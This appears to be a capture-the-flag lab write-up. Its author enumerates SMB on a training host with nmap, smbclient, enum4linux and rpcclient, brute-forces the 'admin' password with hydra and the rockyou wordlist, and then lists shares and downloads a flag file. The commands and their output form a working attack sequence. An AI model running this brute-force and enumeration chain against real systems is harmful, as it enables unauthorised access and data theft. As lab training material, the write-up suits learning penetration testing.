Task - Get the Flag from one of the smb share if exist on IP 192.241.81.3

# First ill look at dialect and security mode using nmap

`I found that there is default settings and a guest user`

root@attackdefense:~# `nmap 192.241.81.3 --script smb-protocols` 
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 04:47 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
root@attackdefense:~# `nmap 192.241.81.3 --script smb-security-mode`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 04:48 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds

# Now ill try to enumerate or list shares in possible ways


Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds

1. Tried with smbmap and smbclient, this used guest user but I think guest user with no password is not allowed so didnt got anything

root@attackdefense:~# `smbmap -u guest -p "" -H 192.241.81.3`
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 192.241.81.3

root@attackdefense:~# `smbclient -L 192.241.81.3`
Enter WORKGROUP\GUEST's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@attackdefense:~# 

2. Tried with Nmap, again access denied but I got two shares which is a guess,  ADMIN and IPC$

root@attackdefense:~# `nmap 192.241.81.3 --script smb-enum-shares`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 04:54 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000011s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\192.241.81.3\ADMIN: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\192.241.81.3\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>


First Ill try to look what users are supported and their read/write access to shares

# Now ill try to find the users that exist

1. Tries with nmap, but didnt gave anything

root@attackdefense:~# `nmap --script smb-enum-users 192.241.81.3`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 05:08 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds

2. trying with enum4linux,  but no luck

root@attackdefense:~# `enum4linux -U 192.241.81.3`
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  6 05:10:15 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.241.81.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.241.81.3    |
 ==================================================== 
[+] Got domain/workgroup name: RECONLABS

 ===================================== 
|    Session Check on 192.241.81.3    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

3. tried with rpcclient but no luck as we already know that some blank user pass is not working

root@attackdefense:~# `rpcclient -U "" -N 192.241.81.3`
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

# So now we need to figure out the password in any way

1. Using hydra to bruteforce

root@attackdefense:/# `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb`
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-06 06:06:28
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.241.81.3:445/
[445][smb] host: 192.241.81.3   login: admin   password: `password1`
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-06 06:06:30


# We finally found a password,  lets use it find users which we didnt found before without auth

root@attackdefense:/# `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.241.81.3`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 06:09 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000014s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Host script results:
| smb-enum-users: 
|   SAMBA-RECON-BRUTE\admin (RID: 1003)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON-BRUTE\jane (RID: 1001)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON-BRUTE\nancy (RID: 1002)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON-BRUTE\shawn (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

# We found that there are many users like Jane, nancy, shawn

# Now lets list shares with auth, we find the shares and there access related details

root@attackdefense:/# `nmap --script smb-enum-shares --script-args smbusername=admin,smbpassword=password1 192.241.81.3`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-06 06:11 UTC
Nmap scan report for target-1 (192.241.81.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:F1:51:03 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: admin
|   \\192.241.81.3\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (brute.samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\192.241.81.3\admin: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\admin
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\192.241.81.3\nancy: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\nancy
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\192.241.81.3\shawn: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\shawn
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds

# Lets connect to \\192.241.81.3\admin: share , and finally we get the flag

root@attackdefense:/# `smbclient //192.241.81.3/admin -U admin`
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> `ls`
  .                                   D        0  Wed Dec  6 06:11:04 2023
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 202553476 blocks available
smb: \> `cd hidden`
smb: \hidden\> `ls`
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Wed Dec  6 06:11:04 2023
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 202553476 blocks available
smb: \hidden\> `get flag.tar.gz `
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> `exit`
root@attackdefense:/# `ls`
0  bin  boot  dev  etc  flag.tar.gz  home  lib  lib32  lib64  media  mnt  opt  proc  root  run  sbin  srv  startup.sh  sys  tmp  usr  var
root@attackdefense:/# `gzip -d flag.tar.gz `
root@attackdefense:/# `cat flag.tar` 
flag0000644000000000001530000000004113377315030011541 0ustar  rootsambashare2727069bc058053bd561ce372721c92e
root@attackdefense:/# 